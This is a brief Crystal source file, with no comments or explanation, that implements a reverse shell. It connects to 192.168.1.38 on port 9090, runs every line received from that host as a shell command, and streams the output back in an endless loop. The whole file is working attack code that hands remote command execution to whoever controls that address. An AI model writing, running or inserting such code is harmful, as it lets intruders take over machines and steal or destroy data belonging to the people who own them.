require "process"
require "socket"

c = Socket.tcp(Socket::Family::INET)
c.connect "192.168.1.38", 9090
while true
   m, l = c.receive
   p = Process.new(m.rstrip('\n'), output: Process::Redirect::Pipe, shell: true)
   c << p.output.gets_to_end
end
